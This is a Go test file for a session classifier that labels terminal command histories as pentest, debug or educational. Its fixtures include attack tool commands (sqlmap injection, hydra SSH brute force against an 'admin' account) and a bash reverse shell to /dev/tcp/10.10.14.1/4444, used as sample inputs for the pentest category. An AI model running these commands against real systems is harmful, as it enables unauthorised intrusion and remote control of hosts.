package detect

import (
	"strings"
	"testing"

	"github.com/perxibes/termdossier/internal/store"
)

func TestDetect_PentestSession(t *testing.T) {
	events := []store.Event{
		{Stdin: "nmap -sV 10.10.10.1"},
		{Stdin: "gobuster dir -u http://10.10.10.1"},
		{Stdin: "sqlmap -u http://10.10.10.1/vuln?id=1"},
		{Stdin: "hydra -l admin -P passwords.txt ssh://10.10.10.1"},
	}

	result := Detect(events)
	if result.Type != TypePentest {
		t.Errorf("Detect pentest: got %q, want %q", result.Type, TypePentest)
	}
	if result.Confidence < 0.5 {
		t.Errorf("Detect pentest confidence too low: %.2f", result.Confidence)
	}
}

func TestDetect_DebugSession(t *testing.T) {
	events := []store.Event{
		{Stdin: "go build ./..."},
		{Stdin: "go test ./internal/..."},
		{Stdin: "git commit -m 'fix bug'"},
		{Stdin: "npm test"},
		{Stdin: "docker build -t myapp ."},
	}

	result := Detect(events)
	if result.Type != TypeDebug {
		t.Errorf("Detect debug: got %q, want %q", result.Type, TypeDebug)
	}
	if result.Confidence < 0.3 {
		t.Errorf("Detect debug confidence too low: %.2f", result.Confidence)
	}
}

func TestDetect_HTBIPDetection(t *testing.T) {
	events := []store.Event{
		{Stdin: "nmap 10.10.14.5"},
		{Stdin: "curl http://10.129.45.12"},
	}

	result := Detect(events)
	if result.Type != TypePentest {
		t.Errorf("Detect HTB IP: got %q, want %q", result.Type, TypePentest)
	}

	found := false
	for _, r := range result.Reasons {
		if containsStr(r, "HTB") || containsStr(r, "CTF") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected HTB/CTF reason in detection results")
	}
}

func TestDetect_ReverseShell(t *testing.T) {
	events := []store.Event{
		{Stdin: "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"},
	}

	result := Detect(events)
	if result.Type != TypePentest {
		t.Errorf("Detect revshell: got %q, want %q", result.Type, TypePentest)
	}
}

func TestDetect_GenericSession(t *testing.T) {
	events := []store.Event{
		{Stdin: "echo hello"},
		{Stdin: "cat /etc/hostname"},
		{Stdin: "date"},
	}

	result := Detect(events)
	if result.Type != TypeEducational {
		t.Errorf("Detect generic: got %q, want %q", result.Type, TypeEducational)
	}
}

func TestDetect_EmptySession(t *testing.T) {
	result := Detect(nil)
	if result.Type != TypeEducational {
		t.Errorf("Detect empty: got %q, want %q", result.Type, TypeEducational)
	}
}

func containsStr(s, sub string) bool {
	return len(s) >= len(sub) && strings.Contains(s, sub)
}

// Need strings import for containsStr
func init() {}
